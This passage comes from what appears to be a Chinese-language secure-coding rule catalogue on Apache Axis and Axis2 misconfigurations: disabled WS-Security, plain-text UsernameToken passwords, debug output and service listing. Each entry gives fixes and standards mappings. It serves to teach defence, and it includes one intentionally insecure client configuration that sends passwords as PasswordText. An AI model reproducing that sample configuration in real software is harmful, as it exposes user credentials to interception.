<p>[25] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-WS-Security-Not-Enabled"><a href="#Axis-2-Service-Requester-Misconfiguration-WS-Security-Not-Enabled" class="headerlink" title="Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled"></a>Axis 2 Service Requester Misconfiguration: WS-Security Not Enabled</h4><h5 id="ABSTRACT-167"><a href="#ABSTRACT-167" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>关闭 WS-Security 难以保证消息完整性和保密性。</p>
<h5 id="EXPLANATION-168"><a href="#EXPLANATION-168" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>未启用 Rampart WS-Security 模块。WS-Security 是 SOAP 的扩展功能，无论采用何种传输协议，它都能提供端到端的消息完整性和保密性。不使用 WS-Security 时，将依靠传输安全性来保证消息的完整性和保密性。如果一项服务将消息转发到其他服务，则会使用中继点之间最薄弱的传输机制传送消息。WS-Security 可移除传输安全性 dependency，并将安全性内置到消息中。</p>
<h5 id="RECOMMENDATIONS-167"><a href="#RECOMMENDATIONS-167" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则将客户端配置为使用 Rampart WS-Security 模块。在客户端配置文件中添加 <code>&lt;module ref=“rampart”/&gt;</code>，便可启用此模块。</p>
<h5 id="REFERENCES-166"><a href="#REFERENCES-166" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A9 Insecure Communications</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A9 Insufficient Transport Layer Protection</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.4, Requirement 6.5.9</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.4</p>
<p>[16] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 319</p>
<p>[17] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[18] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260.1 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000180 CAT II, APSC-DV-000260 CAT II, APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[30] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-2-Service-Requester-Misconfiguration-Weak-Token"><a href="#Axis-2-Service-Requester-Misconfiguration-Weak-Token" class="headerlink" title="Axis 2 Service Requester Misconfiguration: Weak Token"></a>Axis 2 Service Requester Misconfiguration: Weak Token</h4><h5 id="ABSTRACT-168"><a href="#ABSTRACT-168" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若在未经加密的通道上使用 UsernameToken 及明文密码，则可截取 SOAP 消息的攻击者会趁机获取该密码。</p>
<h5 id="EXPLANATION-169"><a href="#EXPLANATION-169" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若通过未经加密的通道发送明文密码，则可截取 SOAP 消息的攻击者会趁机获取凭证。</p>
<p>下列 Axis 2 客户端配置使用了 UsernameToken（一个密码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;UsernameToken&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">        &lt;user&gt;bob&lt;/user&gt;</span><br><span class="line"></span><br><span class="line">        &lt;passwordCallbackClass&gt;org.apache.rampart.samples.PWCBHandler&lt;/passwordCallbackClass&gt;</span><br><span class="line"></span><br><span class="line">        &lt;passwordType&gt;PasswordText&lt;/passwordType&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/action&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-168"><a href="#RECOMMENDATIONS-168" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>如果服务提供程序提供支持，则使用签名代替 UsernameToken。下面提供了一个配置示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;axisconfig name=&quot;AxisJava2.0&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    &lt;parameter name=&quot;OutflowSecurity&quot;&gt;</span><br><span class="line"></span><br><span class="line">      &lt;action&gt;</span><br><span class="line"></span><br><span class="line">        &lt;items&gt;Timestamp Signature Encrypt&lt;/items&gt;</span><br><span class="line"></span><br><span class="line">        &lt;user&gt;client&lt;/user&gt;</span><br><span class="line"></span><br><span class="line">        &lt;passwordCallbackClass&gt;org.apache.rampart.samples.PWCBHandler&lt;/passwordCallbackClass&gt;</span><br><span class="line"></span><br><span class="line">        &lt;signaturePropFile&gt;client.properties&lt;/signaturePropFile&gt;</span><br><span class="line"></span><br><span class="line">        &lt;signatureKeyIdentifier&gt;DirectReference&lt;/signatureKeyIdentifier&gt;</span><br><span class="line"></span><br><span class="line">        &lt;encryptionKeyIdentifier&gt;SKIKeyIdentifier&lt;/encryptionKeyIdentifier&gt;</span><br><span class="line"></span><br><span class="line">        &lt;encryptionUser&gt;service&lt;/encryptionUser&gt;</span><br><span class="line"></span><br><span class="line">      &lt;/action&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/parameter&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/axisconfig&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-167"><a href="#REFERENCES-167" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Securing SOAP Messages with Rampart Apache Software Foundation</p>
<p>[2] Web Services Security: SOAP Message Security 1.1 OASIS</p>
<p>[3] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[4] Standards Mapping - Common Weakness Enumeration CWE ID 311</p>
<p>[5] Standards Mapping - FIPS200 MP</p>
<p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[8] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[10] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[11] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[18] Standards Mapping - SANS Top 25 2010 Porous Defenses - CWE ID 311</p>
<p>[19] Standards Mapping - SANS Top 25 2011 Porous Defenses - CWE ID 311</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I, APSC-DV-002440 CAT I, APSC-DV-002450 CAT II, APSC-DV-002460 CAT II, APSC-DV-002470 CAT II</p>
<p>[30] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[31] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
<h4 id="Axis-Misconfiguration-Debug-Information"><a href="#Axis-Misconfiguration-Debug-Information" class="headerlink" title="Axis Misconfiguration: Debug Information"></a>Axis Misconfiguration: Debug Information</h4><h5 id="ABSTRACT-169"><a href="#ABSTRACT-169" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>调试信息可帮助攻击者了解系统并规划攻击方式。</p>
<h5 id="EXPLANATION-170"><a href="#EXPLANATION-170" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在服务器的配置文件中，若将 axis.development.system 设为 true，该系统将像开发环境一样运行。它会在 SOAP 响应中发送堆栈跟踪信息，可能会泄漏系统或应用程序的相关信息。</p>
<h5 id="RECOMMENDATIONS-169"><a href="#RECOMMENDATIONS-169" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在服务器配置文件中，将 axis.development.system 参数设为 false。 例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;parameter name=&quot;axis.development.system&quot; value=&quot;false&quot;/&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-168"><a href="#REFERENCES-168" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Axis Reference Guide Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 215</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Axis-Misconfiguration-Service-Enumeration"><a href="#Axis-Misconfiguration-Service-Enumeration" class="headerlink" title="Axis Misconfiguration: Service Enumeration"></a>Axis Misconfiguration: Service Enumeration</h4><h5 id="ABSTRACT-170"><a href="#ABSTRACT-170" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>公开披露与服务有关的信息，可让攻击者了解如何利用该服务的重要信息。</p>
<h5 id="EXPLANATION-171"><a href="#EXPLANATION-171" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>若将 axis.disableServiceList 设为 false，Apache Axis 会在对 servlet 根执行 GET 时返回可用服务的列表。此服务列表可能包含不应公开访问的功能列表。</p>
<h5 id="RECOMMENDATIONS-170"><a href="#RECOMMENDATIONS-170" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>最低限度是，只允许可信赖的用户访问此服务列表，且确保不披露非必需的服务。不过，建议您禁用同时列出所有服务的功能。</p>
<p>下列配置显示了如何防止列出服务：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;parameter name=&quot;axis.disableServiceList&quot; value=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-169"><a href="#REFERENCES-169" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Axis Reference Guide Apache Software Foundation</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 651</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II, APSC-DV-001870 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="Axis-Service-Provider-Misconfiguration-Plain-Text-Password"><a href="#Axis-Service-Provider-Misconfiguration-Plain-Text-Password" class="headerlink" title="Axis Service Provider Misconfiguration: Plain Text Password"></a>Axis Service Provider Misconfiguration: Plain Text Password</h4><h5 id="ABSTRACT-171"><a href="#ABSTRACT-171" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>避免使用 WS-Security 密码类型 PasswordText。</p>
<h5 id="EXPLANATION-172"><a href="#EXPLANATION-172" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用 PasswordText 密码类型，可能表示实际密码是以明文发送的。WS-Security UsernameToken 配置文件指明 <code>UsernameToken &lt;Password&gt;</code>标签中发送的文本不限于实际密码。它们还可能是派生的密码。然而，开发人员通常发送的是实际密码而不是派生的密码。发送未经加密的密码或密码散列值，都会将凭证泄漏给可以截取信息流的任何人。</p>
<h5 id="RECOMMENDATIONS-171"><a href="#RECOMMENDATIONS-171" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>采用 PasswordDigest 密码类型，确保凭证在发送时已加密。采用 HTTPS 协议发送 SOAP 消息能确保凭证得到强大的加密技术保护，但是如果采用多种传输方式转发消息，更好的选择是使用 WS-Security 对消息自身进行加密。</p>
<p>下面提供了服务提供程序配置，密码类型设为 PasswordDigest。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;deployment xmlns=&quot;http://xml.apache.org/axis/wsdd/&quot; xmlns:java=&quot;http://xml.apache.org/axis/wsdd/providers/java&quot;&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &lt;requestFlow&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">	&lt;parameter name=&quot;passwordType&quot; value=&quot;PasswordDigest&quot; /&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;/deployment&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-170"><a href="#REFERENCES-170" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Web Services Security Username Token Profile 1.0 OASIS</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 522</p>
<p>[3] Standards Mapping - FIPS200 MP</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-8 Transmission Confidentiality and Integrity (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M3 Insufficient Transport Layer Protection</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A8 Insecure Storage</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A8 Insecure Cryptographic Storage</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A7 Insecure Cryptographic Storage</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A6 Sensitive Data Exposure</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 4.1, Requirement 6.5.8, Requirement 8.4</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 4.1, Requirement 6.3.1.3, Requirement 6.5.8, Requirement 8.4</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.4</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 4.1, Requirement 6.5.3, Requirement 8.2.1</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260.1 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3250.1 CAT I, APP3250.2 CAT I, APP3250.3 CAT II, APP3250.4 CAT II, APP3330 CAT I, APP3260 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000220 CAT II, APSC-DV-001750 CAT I</p>
<p>[26] Standards Mapping - Web Application Security Consortium 24 + 2 Insufficient Authentication</p>
<p>[27] Standards Mapping - Web Application Security Consortium Version 2.00 Insufficient Transport Layer Protection (WASC-04)</p>
